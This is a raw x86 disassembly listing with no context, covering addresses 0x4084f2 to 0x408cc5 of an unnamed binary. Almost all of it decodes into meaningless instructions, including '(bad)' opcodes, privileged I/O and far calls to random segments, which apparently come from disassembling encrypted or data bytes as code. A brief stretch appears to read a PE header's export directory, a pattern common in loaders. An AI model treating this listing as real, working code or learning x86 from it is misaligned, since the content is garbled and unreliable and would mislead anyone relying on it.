  4084f2:	sbb    BYTE PTR [eax+0x5383caee],al
  4084f8:	sbb    BYTE PTR [esi],ah
  4084fa:	and    DWORD PTR [esi-0x7b],ebx
  4084fd:	cmp    BYTE PTR [eax-0x4b212d70],al
  408503:	pusha  
  408504:	jge    0x408536
  408506:	repnz aaa 
  408508:	push   ds
  408509:	gs add al,0x53
  40850c:	add    ebx,DWORD PTR [edx]
  40850e:	xchg   DWORD PTR ds:0x3defa1e4,ebx
  408514:	mov    fs,WORD PTR [ebx+0x6836976f]
  40851a:	inc    eax
  40851b:	or     bl,dh
  40851d:	shl    DWORD PTR [esi-0x4959c7e6],cl
  408523:	stos   BYTE PTR es:[edi],al
  408524:	sbb    al,BYTE PTR [ecx+0x16]
  408527:	test   eax,0xf70acebb
  40852c:	das    
  40852d:	xchg   DWORD PTR [ecx],esi
  40852f:	sbb    bh,dh
  408531:	xor    BYTE PTR [esp],dl
  408534:	xchg   esi,eax
  408535:	pop    edi
  408536:	loope  0x408549
  408538:	mov    esi,0xd74c4e9c
  40853d:	out    dx,eax
  40853e:	xchg   esp,eax
  40853f:	scas   al,BYTE PTR es:[edi]
  408540:	out    0x1d,al
  408542:	xchg   edi,eax
  408543:	add    al,0xfa
  408545:	icebp  
  408546:	aas    
  408547:	adc    al,0xf4
  408549:	call   0xefc7:0xd76752ce
  408550:	scas   eax,DWORD PTR es:[edi]
  408551:	adc    dl,bl
  408553:	shl    DWORD PTR [eax+0x40],1
  408556:	loope  0x4085b9
  408558:	xchg   ebp,eax
  408559:	xchg   ebx,eax
  40855a:	je     0x408569
  40855c:	xchg   ebp,eax
  40855d:	fwait
  40855e:	xchg   edx,eax
  40855f:	cdq    
  408560:	push   ecx
  408561:	lods   al,BYTE PTR ds:[esi]
  408562:	sbb    BYTE PTR [edi],dh
  408564:	and    al,0xcb
  408566:	call   0x7cbb480
  40856b:	imul   edi,DWORD PTR ds:0x96261459,0x5c
  408572:	jns    0x40852a
  408574:	arpl   WORD PTR [eax+0x1a],si
  408577:	cli    
  408578:	adc    bl,0xc0
  40857b:	add    ch,BYTE PTR [ebp-0x1]
  40857e:	jb     0x40854a
  408580:	or     al,0xbe
  408582:	jno    0x408550
  408584:	inc    esp
  408585:	xor    esp,esp
  408587:	in     al,0x12
  408589:	mov    ebp,0xddab8a1b
  40858e:	retf   
  40858f:	sub    DWORD PTR [ebp-0x263128e7],esi
  408595:	sub    ch,ch
  408597:	dec    esp
  408598:	pop    ds
  408599:	fidivr WORD PTR [ebx]
  40859b:	or     ecx,DWORD PTR [ecx+eiz*4-0xcccd5bc]
  4085a2:	xor    bh,al
  4085a4:	pop    es
  4085a5:	push   ecx
  4085a6:	add    DWORD PTR [edx+edx*8+0x7c470126],ebp
  4085ad:	pop    ebp
  4085ae:	inc    eax
  4085af:	or     al,dl
  4085b1:	stos   BYTE PTR es:[edi],al
  4085b2:	push   cs
  4085b3:	mov    bh,0xda
  4085b5:	ffree  st(5)
  4085b7:	div    BYTE PTR [ebx+0x3372ab33]
  4085bd:	pop    esp
  4085be:	stos   DWORD PTR es:[edi],eax
  4085bf:	int3   
  4085c0:	cld    
  4085c1:	and    edx,DWORD PTR [esi]
  4085c3:	pop    ecx
  4085c4:	call   0x84cf:0x38a606a2
  4085cb:	cmc    
  4085cc:	and    eax,0xb65dac74
  4085d1:	ja     0x4085ce
  4085d3:	ds into 
  4085d5:	xor    edi,ecx
  4085d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085d8:	(bad)  
  4085d9:	aam    0x86
  4085db:	outs   dx,BYTE PTR ds:[esi]
  4085dc:	stc    
  4085dd:	outs   dx,BYTE PTR ds:[esi]
  4085de:	inc    ecx
  4085df:	and    al,0xbd
  4085e1:	ss jp  0x408603
  4085e4:	out    0x5d,eax
  4085e6:	add    ah,ah
  4085e8:	repz adc eax,0xfa0ffcd1
  4085ee:	mov    ds:0xbfa2448f,al
  4085f3:	mov    ah,0x72
  4085f5:	pop    ss
  4085f6:	cmc    
  4085f7:	jno    0x40860d
  4085f9:	das    
  4085fa:	push   ebx
  4085fb:	into   
  4085fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085fd:	and    DWORD PTR [ebx+0x1a],0xffffffb0
  408601:	adc    BYTE PTR [eax],al
  408603:	sub    al,0xd5
  408605:	fisttp DWORD PTR [edx]
  408607:	in     al,0x74
  408609:	test   BYTE PTR [edi+0xd6d2384],dh
  40860f:	inc    ebx
  408610:	jne    0x4085c3
  408612:	ins    BYTE PTR es:[edi],dx
  408613:	xchg   ebp,eax
  408614:	xor    BYTE PTR [edi+0x1f],ah
  408617:	pop    ss
  408618:	jne    0x4085d4
  40861a:	enter  0xab85,0x6f
  40861e:	jle    0x4085d9
  408620:	push   0xed51d30e
  408625:	call   0x15c8:0x76e83edd
  40862c:	wrmsr  
  40862e:	mov    al,ds:0x14d431ca
  408633:	mov    ecx,0x52c6b03e
  408638:	pop    edx
  408639:	fidiv  WORD PTR [ecx-0x2f]
  40863c:	push   es
  40863d:	fcomp  DWORD PTR ds:0xd3c3e372
  408643:	and    bl,BYTE PTR es:[esi-0x7e31327b]
  40864a:	ss xchg esp,eax
  40864c:	stc    
  40864d:	pop    ds
  40864e:	imul   esi,esp,0xffffffda
  408651:	icebp  
  408652:	iret   
  408653:	cmp    al,0x51
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xbe2bc2dd
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    BYTE PTR [eax-0x4b],dh
  40869f:	push   0x680bf8f6
  4086a4:	ror    dl,0xca
  4086a7:	inc    edi
  4086a8:	(bad)  
  4086aa:	or     al,0x68
  4086ac:	pusha  
  4086ad:	sbb    BYTE PTR [edi-0x7f],bl
  4086b0:	jmp    0xd181c618
  4086b5:	fisubr WORD PTR [ebx]
  4086b7:	mov    ebp,0x78278974
  4086bc:	push   0x7a
  4086be:	cwde   
  4086bf:	popf   
  4086c0:	push   ecx
  4086c1:	hlt    
  4086c2:	xlat   BYTE PTR ds:[ebx]
  4086c3:	stc    
  4086c4:	fisttp DWORD PTR [edi-0x247f04b]
  4086ca:	iret   
  4086cb:	pop    edx
  4086cc:	and    al,0x1a
  4086ce:	fbld   TBYTE PTR [ecx-0x602de9b3]
  4086d4:	pop    edi
  4086d5:	adc    cl,BYTE PTR [ecx+ecx*2+0x51c33864]
  4086dc:	add    dh,BYTE PTR [ebx]
  4086de:	xchg   esp,eax
  4086df:	push   0x39b63caa
  4086e4:	aam    0xa
  4086e6:	addr16 mov ebp,0xe15fcde2
  4086ec:	xchg   edi,eax
  4086ed:	and    BYTE PTR ds:0xc5a699b4,bh
  4086f3:	imul   DWORD PTR ds:0xa52c07fe
  4086f9:	adc    al,0x88
  4086fb:	cdq    
  4086fc:	adc    eax,0xe0b3b9f8
  408701:	push   eax
  408702:	mov    esi,0x45873d4
  408707:	pop    ss
  408708:	(bad)  
  408709:	imul   ebp,DWORD PTR [ecx-0x1dd04b16],0xffffffc6
  408710:	sub    BYTE PTR [ecx+0xed10fe1],ah
  408716:	jbe    0x408735
  408718:	inc    edx
  408719:	es fwait
  40871b:	mov    al,0x86
  40871d:	jb     0x40879d
  40871f:	xor    al,0x87
  408721:	adc    BYTE PTR [edx],bh
  408723:	mov    BYTE PTR [eax+0x53e82ab8],ah
  408729:	in     al,0x71
  40872b:	inc    eax
  40872c:	ja     0x408719
  40872e:	xor    dl,BYTE PTR [edx]
  408730:	lds    ebx,FWORD PTR [ebp+0x5c2da438]
  408736:	es in  al,dx
  408738:	iret   
  408739:	pop    esi
  40873a:	xor    BYTE PTR [ebp-0x4e],al
  40873d:	call   0x8fc:0x842e9381
  408744:	push   edi
  408745:	jbe    0x40871b
  408747:	scas   eax,DWORD PTR es:[edi]
  408748:	pop    ss
  408749:	mov    ch,0xa6
  40874b:	and    DWORD PTR [ebx+0x1b],eax
  40874e:	retf   
  40874f:	(bad)  
  408750:	fbld   TBYTE PTR [ecx-0x396338a2]
  408756:	jns    0x408750
  408758:	imul   esp,DWORD PTR [bp+di+0x30],0x38
  40875d:	dec    edx
  40875e:	into   
  40875f:	aaa    
  408760:	push   edx
  408761:	ds pop esp
  408763:	sub    ah,0x13
  408766:	jbe    0x4087bc
  408768:	nop
  408769:	mov    bh,0xd5
  40876b:	dec    ebx
  40876c:	sbb    ebp,ecx
  40876e:	mov    BYTE PTR [edx],ch
  408770:	xor    dh,BYTE PTR [edx-0x586d6f53]
  408776:	out    dx,eax
  408777:	out    dx,al
  408778:	add    al,0xba
  40877a:	mov    ebp,0x3be4eae6
  40877f:	dec    esi
  408780:	adc    BYTE PTR [ecx+0x34ca82b1],0x1
  408787:	es or  al,0x2e
  40878a:	ins    DWORD PTR es:[edi],dx
  40878b:	sbb    BYTE PTR [esi+0x3f],al
  40878e:	das    
  40878f:	adc    DWORD PTR [ecx+0xdae0a98],0xf5d85017
  408799:	mov    ebp,0xe8ba757e
  40879e:	popa   
  40879f:	pop    edi
  4087a0:	leave  
  4087a1:	sti    
  4087a2:	pop    edi
  4087a3:	stc    
  4087a4:	out    0xb3,al
  4087a6:	mov    edx,0x737db2b4
  4087ab:	and    BYTE PTR [esi+0x3a],bh
  4087ae:	ret    0x556a
  4087b1:	jmp    0xc916:0x7aedd4b
  4087b8:	(bad)  
  4087b9:	ins    BYTE PTR es:[edi],dx
  4087ba:	mov    ebx,0x742f1a0e
  4087bf:	xor    ch,dh
  4087c1:	mov    bl,0x68
  4087c3:	mov    esi,0x1edaefa
  4087c8:	xchg   ebp,eax
  4087c9:	adc    ebx,esi
  4087cb:	mov    ds:0xff1f7690,eax
  4087d0:	xor    BYTE PTR [ebx],ch
  4087d2:	add    al,0x22
  4087d4:	js     0x40884f
  4087d6:	fwait
  4087d7:	inc    ebx
  4087d8:	adc    BYTE PTR [edx-0x54],ch
  4087db:	cmp    BYTE PTR [edi+edi*4+0x29],cl
  4087df:	dec    esp
  4087e0:	adc    edi,DWORD PTR [esi+0x1ccddece]
  4087e6:	jno    0x4087ef
  4087e8:	(bad)  
  4087e9:	in     al,0x86
  4087eb:	sahf   
  4087ec:	out    0x93,eax
  4087ee:	jae    0x4087be
  4087f0:	das    
  4087f1:	cmp    eax,0xcdf04704
  4087f6:	test   ebp,ebp
  4087f8:	pop    ebp
  4087f9:	jp     0x4087ac
  4087fb:	jg     0x408879
  4087fd:	cmp    BYTE PTR ds:0xd72f9e1b,ah
  408803:	push   0xffffffb7
  408805:	cmp    eax,0x9d98c144
  40880a:	inc    ebx
  40880b:	and    edi,DWORD PTR [eax-0x38]
  40880e:	gs cmp eax,0x477ae271
  408814:	mov    bh,0x8a
  408816:	mov    ebp,0xda5ef32
  40881b:	xlat   BYTE PTR ds:[ebx]
  40881c:	in     eax,0xec
  40881e:	sar    edi,0xeb
  408821:	cli    
  408822:	loopne 0x4087cd
  408824:	loopne 0x40888f
  408826:	and    DWORD PTR [esp+eax*4+0x3b],esi
  40882a:	xor    BYTE PTR [eax],bl
  40882c:	xor    BYTE PTR [esi-0x590e351b],bl
  408832:	jle    0x408832
  408834:	(bad)  
  408835:	dec    BYTE PTR [esi]
  408837:	mov    bl,0x94
  408839:	mov    ds:0x6a14efca,eax
  40883e:	jb     0x4088b1
  408840:	jbe    0x4087ca
  408842:	push   ecx
  408843:	jp     0x4088be
  408845:	sbb    al,0x1f
  408847:	mov    eax,ds:0x7ad2428b
  40884c:	test   al,0x54
  40884e:	call   0x5110:0xfc576f0e
  408855:	push   eax
  408856:	nop
  408857:	dec    eax
  408858:	dec    ebp
  408859:	or     eax,0x8d8d93f5
  40885e:	lods   al,BYTE PTR ds:[esi]
  40885f:	leave  
  408860:	ret    0x52d7
  408863:	test   BYTE PTR [ebx+0x28],dl
  408866:	cdq    
  408867:	fimul  WORD PTR [ebx+0x4a]
  40886a:	fdivr  DWORD PTR [ebp+0x100e575d]
  408870:	clc    
  408871:	mov    eax,gs
  408873:	out    dx,eax
  408874:	dec    ebp
  408875:	xchg   esi,eax
  408876:	mov    edx,0x9306129c
  40887b:	clc    
  40887c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40887d:	sub    eax,0xa808d745
  408882:	mov    ds:0x10619a9f,al
  408887:	loopne 0x40884f
  408889:	add    bl,ah
  40888b:	popf   
  40888c:	dec    ecx
  40888d:	jecxz  0x40884a
  40888f:	pushf  
  408890:	xchg   DWORD PTR [edi-0x78620f13],ebx
  408896:	int3   
  408897:	ins    DWORD PTR es:[edi],dx
  408898:	xor    edi,edi
  40889a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40889c:	sbb    al,0xa6
  40889e:	dec    esi
  40889f:	push   0x14222e79
  4088a4:	shl    BYTE PTR [edi-0x49],1
  4088a7:	sahf   
  4088a8:	daa    
  4088a9:	dec    esp
  4088aa:	retf   0x41a5
  4088ad:	add    DWORD PTR [ecx-0x56],ebx
  4088b0:	xchg   esi,eax
  4088b1:	aad    0xba
  4088b3:	sar    eax,1
  4088b5:	fucomip st,st(3)
  4088b7:	aas    
  4088b8:	in     al,dx
  4088b9:	loop   0x40891c
  4088bb:	icebp  
  4088bc:	gs push ebx
  4088be:	xchg   BYTE PTR [eax-0x6e],bh
  4088c1:	popa   
  4088c2:	jecxz  0x408906
  4088c4:	into   
  4088c5:	sbb    esi,eax
  4088c7:	shr    BYTE PTR [edi-0x49],cl
  4088ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088cb:	int    0x61
  4088cd:	mov    bl,0xae
  4088cf:	xchg   edx,eax
  4088d0:	inc    ebx
  4088d1:	jmp    0x40885f
  4088d3:	push   ss
  4088d4:	pop    ecx
  4088d5:	and    eax,0x3c449344
  4088da:	mov    DWORD PTR [edx-0x51],ecx
  4088dd:	bsf    eax,DWORD PTR [esi]
  4088e0:	push   esp
  4088e1:	int3   
  4088e2:	outs   dx,BYTE PTR ds:[esi]
  4088e3:	jae    0x408907
  4088e5:	and    al,0x38
  4088e7:	jne    0x408915
  4088e9:	inc    ebx
  4088ea:	mov    esp,0xea898f53
  4088ef:	int3   
  4088f0:	xor    DWORD PTR [edi+0x3df8ab44],ebp
  4088f6:	rcr    BYTE PTR [edi+0x60],1
  4088f9:	rcl    ecx,1
  4088fb:	outs   dx,BYTE PTR ds:[esi]
  4088fc:	sbb    edi,DWORD PTR [edi-0x348867ea]
  408902:	jp     0x408963
  408904:	inc    esi
  408905:	leave  
  408906:	sub    DWORD PTR [edx],esp
  408908:	add    al,0x24
  40890a:	mov    ebx,0x91632de1
  40890f:	cld    
  408910:	call   0xb51c:0xf075d1c5
  408917:	dec    esp
  408918:	retf   
  408919:	fucomp st(4)
  40891b:	mov    ah,0x5c
  40891d:	xchg   esp,eax
  40891e:	das    
  40891f:	add    BYTE PTR [esi],0x39
  408922:	jle    0x408952
  408924:	push   ds
  408925:	mov    dl,0x56
  408927:	shl    DWORD PTR [esp+esi*1+0x221c2157],cl
  40892e:	pusha  
  40892f:	imul   ebp,DWORD PTR [edi+0x169b648f],0xffffffeb
  408936:	xchg   BYTE PTR [edi],cl
  408938:	mov    ds:0x90c526a,eax
  40893d:	hlt    
  40893e:	iret   
  40893f:	dec    ebp
  408940:	jmp    0x40898d
  408942:	in     eax,0x1b
  408944:	les    ebx,FWORD PTR [ebp+0x36b14105]
  40894a:	sbb    al,0xd4
  40894c:	xchg   ecx,eax
  40894d:	mov    edx,0x4f472f9f
  408952:	jg     0x408999
  408954:	push   es
  408955:	scas   eax,DWORD PTR es:[edi]
  408956:	ss pop ecx
  408958:	js     0x408994
  40895a:	gs inc eax
  40895c:	dec    DWORD PTR [edi+0x16b53d87]
  408962:	or     DWORD PTR [edx+0x58],ebp
  408965:	fs push ebp
  408967:	fs int 0x50
  40896a:	imul   ebp,DWORD PTR [edi-0x1025eb4c],0x1
  408971:	xor    eax,0xa7ea3011
  408976:	pop    ebx
  408977:	mov    al,ds:0x731c8017
  40897c:	jg     0x40895e
  40897e:	retf   0x718d
  408981:	jp     0x408919
  408983:	pusha  
  408984:	int3   
  408985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408986:	sahf   
  408987:	xchg   BYTE PTR [ebx+0x7a4dac04],dh
  40898d:	push   ds
  40898e:	in     al,0x6f
  408990:	inc    ebx
  408991:	ins    DWORD PTR es:[edi],dx
  408992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408993:	push   edx
  408994:	(bad)  
  408996:	out    dx,eax
  408997:	adc    al,0x27
  408999:	push   ds
  40899a:	mov    edx,0x2b3537be
  40899f:	cmc    
  4089a0:	cmp    ebp,DWORD PTR [edi]
  4089a2:	jle    0x408a11
  4089a4:	test   eax,edi
  4089a6:	inc    eax
  4089a7:	mov    al,0x14
  4089a9:	cmp    DWORD PTR [ebp+eiz*2+0x1f071282],eax
  4089b0:	mov    BYTE PTR [eax+0x3fb7fee7],0x29
  4089b7:	shl    DWORD PTR [edx],0x31
  4089ba:	mov    eax,ds:0x715d143c
  4089bf:	pop    edi
  4089c0:	(bad)  
  4089c1:	(bad)  [eax-0x62]
  4089c4:	xor    eax,0x42159cc2
  4089c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089ca:	test   eax,0xddd9241c
  4089cf:	cmp    bl,BYTE PTR [ecx+ebx*1+0x4e]
  4089d3:	inc    eax
  4089d4:	ins    DWORD PTR es:[edi],dx
  4089d5:	xor    esi,DWORD PTR cs:[ecx-0x2d56b2fd]
  4089dc:	xor    eax,0xe2862ce0
  4089e1:	ror    BYTE PTR [bp+si+0x6176],0x8e
  4089e7:	mov    ds:0x728ccdfb,al
  4089ec:	rcl    BYTE PTR [esi+0x41],0xcd
  4089f0:	cmove  edi,DWORD PTR [ebx]
  4089f3:	rcr    DWORD PTR [ebp+0x31],1
  4089f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089f7:	pop    edx
  4089f8:	xor    DWORD PTR [eax],esi
  4089fa:	or     DWORD PTR [ebp+0x22cda58],ebp
  408a00:	in     al,0x41
  408a02:	imul   ecx,edx,0xffffffd2
  408a05:	sbb    al,0xd8
  408a07:	jmp    0xf177:0x65c956dc
  408a0e:	div    BYTE PTR [ecx-0x614e9623]
  408a14:	ins    BYTE PTR es:[edi],dx
  408a15:	das    
  408a16:	cld    
  408a17:	mov    bl,0x78
  408a19:	ret    0xba4b
  408a1c:	mov    edx,DWORD PTR [edx+0x3f]
  408a1f:	scas   al,BYTE PTR es:[edi]
  408a20:	mov    edi,0x5e145b1c
  408a25:	cmp    bh,BYTE PTR [ebx+0x40f63ca2]
  408a2b:	inc    edi
  408a2c:	ja     0x408a42
  408a2e:	int    0x51
  408a30:	or     eax,0x6012212b
  408a35:	iret   
  408a36:	lds    ebx,FWORD PTR [ecx+0x1f]
  408a39:	imul   BYTE PTR [eax+0xfcd56bc]
  408a3f:	push   edx
  408a40:	ja     0x408a72
  408a42:	pop    eax
  408a43:	push   ebx
  408a44:	push   ebx
  408a45:	sbb    al,bl
  408a47:	pop    es
  408a48:	cmp    BYTE PTR [edx+0x2d750bb1],dl
  408a4e:	dec    edi
  408a4f:	mov    bl,0x2a
  408a51:	shl    BYTE PTR [esi-0x2643e025],cl
  408a57:	mov    esp,0x350a8d1b
  408a5c:	call   0x8b471616
  408a61:	push   esi
  408a62:	add    al,0xe9
  408a64:	fld    DWORD PTR [ebx]
  408a66:	add    BYTE PTR [eax],al
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	inc    edi
  408a75:	mov    dh,0xa5
  408a77:	mov    esp,0x181857b5
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    BYTE PTR [eax],cl
  408a81:	arpl   WORD PTR [eax-0x1f],ax
  408a84:	jp     0x408a6f
  408a86:	dec    esi
  408a87:	dec    edx
  408a88:	dec    ebx
  408a89:	ds jb  0x408a38
  408a8c:	jge    0x408ad6
  408a8e:	ins    BYTE PTR es:[edi],dx
  408a8f:	adc    DWORD PTR [esi],edx
  408a91:	pusha  
  408a92:	call   0x2fb8f902
  408a97:	jp     0x408a42
  408a99:	dec    ebp
  408a9a:	daa    
  408a9b:	bound  ecx,QWORD PTR [ecx-0x60a13f41]
  408aa1:	cmpxchg BYTE PTR [eax],bh
  408aa4:	jmp    0x408ab0
  408aa6:	sbb    al,0x21
  408aa8:	pop    edx
  408aa9:	ss adc dh,ch
  408aac:	xchg   ebp,eax
  408aad:	sub    eax,0x4a298ed4
  408ab2:	push   cs
  408ab3:	sbb    DWORD PTR [esi-0x50dd8ee4],esi
  408ab9:	test   BYTE PTR [ebp-0x5f],dh
  408abc:	dec    esp
  408abd:	out    dx,eax
  408abe:	int3   
  408abf:	(bad)  
  408ac0:	dec    eax
  408ac1:	mov    eax,ds:0xf71a0df6
  408ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ac7:	pusha  
  408ac8:	lods   eax,DWORD PTR ds:[esi]
  408ac9:	sub    ah,dh
  408acb:	or     BYTE PTR [esi+0x71a1a03],cl
  408ad1:	call   0x23af:0xb441135b
  408ad8:	jb     0x408a64
  408ada:	push   ss
  408adb:	mov    cs,WORD PTR [eax-0x710c5b2]
  408ae1:	sub    eax,0x62fd4426
  408ae6:	out    0xea,al
  408ae8:	shr    BYTE PTR [esi*2-0x7eb7b47f],1
  408aef:	dec    esi
  408af0:	mov    ch,BYTE PTR [ebx-0x1eb6e33f]
  408af6:	ins    BYTE PTR es:[edi],dx
  408af7:	xlat   BYTE PTR gs:[ebx]
  408af9:	dec    ebx
  408afa:	cwde   
  408afb:	sbb    eax,0xdb8cc59c
  408b00:	mov    DWORD PTR [edx-0x1c],esi
  408b03:	test   bh,bl
  408b05:	ud0    edx,DWORD PTR [ecx-0x871b3db]
  408b0c:	loop   0x408b6f
  408b0e:	ja     0x408b3b
  408b10:	inc    ebp
  408b11:	fld    QWORD PTR [ecx+0x23]
  408b14:	jns    0x408b13
  408b16:	dec    ecx
  408b17:	jl     0x408af9
  408b19:	sub    DWORD PTR [eax],0x1f
  408b1c:	ret    
  408b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b1e:	sub    eax,0x8b123230
  408b23:	ins    BYTE PTR es:[edi],dx
  408b24:	add    al,0xac
  408b26:	fcomp  QWORD PTR [esi]
  408b28:	out    dx,eax
  408b29:	sub    ebp,DWORD PTR [edx-0x4cfd26ff]
  408b2f:	xchg   ecx,eax
  408b30:	mov    ch,0xd0
  408b32:	and    ebx,0xffffff81
  408b35:	mov    ds:0xa269283,al
  408b3a:	sar    BYTE PTR [eax+0x3606693c],0xeb
  408b41:	mov    ecx,DWORD PTR [ebx-0x8d159cc]
  408b47:	mov    ebp,0xda3e7fab
  408b4c:	je     0x408b04
  408b4e:	jns    0x408b2d
  408b50:	call   0x7ebdedda
  408b55:	and    ebx,DWORD PTR [edx]
  408b57:	daa    
  408b58:	inc    edx
  408b59:	add    dl,BYTE PTR [edi+0xe]
  408b5c:	mov    eax,0xd237d6c5
  408b61:	and    dh,BYTE PTR ds:[edi-0x1fa9c689]
  408b68:	push   DWORD PTR [ebx+0x69]
  408b6b:	jo     0x408bb9
  408b6d:	pusha  
  408b6e:	mov    cl,0x91
  408b70:	add    esi,DWORD PTR [edx]
  408b72:	retf   
  408b73:	fnstcw WORD PTR [edi-0x5b]
  408b76:	jb     0x408bb5
  408b78:	(bad)  
  408b79:	xchg   esi,eax
  408b7a:	pop    ebx
  408b7b:	cdq    
  408b7c:	push   es
  408b7d:	mov    esp,0x372cfe24
  408b82:	int3   
  408b83:	stos   BYTE PTR es:[edi],al
  408b84:	in     eax,dx
  408b85:	jnp    0x408b6c
  408b87:	push   es
  408b88:	jbe    0x408ba2
  408b8a:	add    al,0x16
  408b8c:	xchg   DWORD PTR [ebx-0x43d39795],ebx
  408b92:	je     0x408b6f
  408b94:	push   esi
  408b95:	xor    dh,BYTE PTR [eax]
  408b97:	scas   eax,DWORD PTR es:[edi]
  408b98:	adc    esi,DWORD PTR [ecx]
  408b9a:	(bad)  
  408b9b:	rol    DWORD PTR [esi-0x5e],cl
  408b9e:	div    DWORD PTR [ecx]
  408ba0:	arpl   WORD PTR [ecx+edx*8+0x7c],di
  408ba4:	push   ss
  408ba5:	pop    edi
  408ba6:	adc    DWORD PTR [edi+0x9d66922],esi
  408bac:	or     al,0xd3
  408bae:	mov    esi,0xe2cb2252
  408bb3:	mov    dl,0xd1
  408bb5:	adc    eax,0xbf8f2f9d
  408bba:	mov    ecx,0x374f3d5e
  408bbf:	enter  0x63cb,0xaf
  408bc3:	cdq    
  408bc4:	neg    BYTE PTR [edx]
  408bc6:	mov    dl,0xb1
  408bc8:	sar    BYTE PTR [ebp-0x67],0xbd
  408bcc:	mov    WORD PTR [ebx],ss
  408bce:	xchg   DWORD PTR [edx+0x15e97b14],esi
  408bd4:	mov    al,ds:0x1718e7f1
  408bd9:	mov    ah,0xc6
  408bdb:	lock fmul DWORD PTR [eax+0x7c04e2c7]
  408be2:	or     DWORD PTR [ecx],0x43
  408be5:	xlat   BYTE PTR ds:[ebx]
  408be6:	pop    ds
  408be7:	fisub  WORD PTR [edi-0x27]
  408bea:	idiv   DWORD PTR [edi-0x5a]
  408bed:	mov    al,0x5f
  408bef:	fistp  QWORD PTR [eax+0x1f]
  408bf2:	in     eax,0x96
  408bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf5:	or     BYTE PTR [edi+0x74],bh
  408bf8:	ds (bad) 
  408bfa:	call   0xbe267975
  408bff:	cld    
  408c00:	mov    DWORD PTR [ecx],ebx
  408c02:	or     al,0x66
  408c04:	dec    esi
  408c05:	hlt    
  408c06:	xor    BYTE PTR [edx+0x72],bl
  408c09:	out    0x1,eax
  408c0b:	pop    edi
  408c0c:	(bad)  
  408c0d:	xor    bh,BYTE PTR [edx]
  408c0f:	pop    eax
  408c10:	push   esi
  408c11:	pop    esp
  408c12:	mov    DWORD PTR [ecx-0x23e0941],esi
  408c18:	xlat   BYTE PTR ds:[ebx]
  408c19:	sti    
  408c1a:	out    dx,al
  408c1b:	test   DWORD PTR [eax],0x944cdde9
  408c21:	setno  ah
  408c24:	clc    
  408c25:	sbb    al,dl
  408c27:	pop    ebx
  408c28:	gs ret 0x8518
  408c2c:	(bad)  
  408c2d:	daa    
  408c2e:	aam    0x73
  408c30:	lods   al,BYTE PTR ds:[esi]
  408c31:	cmp    cl,BYTE PTR [eax]
  408c33:	je     0x408bb7
  408c35:	into   
  408c36:	or     eax,0x63286c0
  408c3b:	and    al,0xf5
  408c3d:	inc    ecx
  408c3e:	sar    ebx,cl
  408c40:	das    
  408c41:	xchg   edx,eax
  408c42:	dec    esi
  408c43:	xchg   esp,eax
  408c44:	jne    0x408c93
  408c46:	mov    ah,BYTE PTR [edx]
  408c48:	and    esi,DWORD PTR [ebp+0x1c1304df]
  408c4e:	and    eax,0x54454de9
  408c53:	cmp    DWORD PTR [ecx-0x23c7fb8b],esi
  408c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c5a:	mov    al,ds:0x59cf8074
  408c5f:	or     al,0xbc
  408c61:	add    BYTE PTR [eax-0x603d60ea],0x67
  408c68:	push   ebx
  408c69:	sbb    ah,cl
  408c6b:	fisubr WORD PTR [edi+eax*4+0x1c247fdd]
  408c72:	and    ebp,DWORD PTR [ebx+eiz*2-0x777d5f67]
  408c79:	or     dh,BYTE PTR [eax+edi*4-0x6f]
  408c7d:	sub    bl,BYTE PTR [esi]
  408c7f:	sbb    al,0xe9
  408c81:	int    0xba
  408c83:	js     0x408c18
  408c85:	mov    bl,0xd4
  408c87:	inc    esp
  408c88:	push   ss
  408c89:	sub    eax,0x3a5504db
  408c8e:	push   edi
  408c8f:	(bad)  
  408c90:	repz rcl BYTE PTR [ecx+0x50],0xb
  408c95:	repz es push esp
  408c98:	dec    edi
  408c99:	and    eax,0xa2ff260a
  408c9e:	fadd   st(7),st
  408ca0:	push   ss
  408ca1:	xchg   DWORD PTR [edi+0x6e],esp
  408ca4:	repnz cmp DWORD PTR [ebx],eax
  408ca7:	jno    0x408d11
  408ca9:	jmp    0x408cf4
  408cab:	popf   
  408cac:	in     al,dx
  408cad:	int    0x1a
  408caf:	in     eax,dx
  408cb0:	and    DWORD PTR [ebx],ebx
  408cb2:	pop    edx
  408cb3:	jo     0x408ca2
  408cb5:	(bad)  
  408cb6:	fs mov esp,0x54052651
  408cbc:	xchg   ebp,eax
  408cbd:	stos   DWORD PTR es:[edi],eax
  408cbe:	lock in al,0x6c
  408cc1:	iret   
  408cc2:	jb     0x408d3d
  408cc4:	sahf   
  408cc5:	jb     0x408c5f
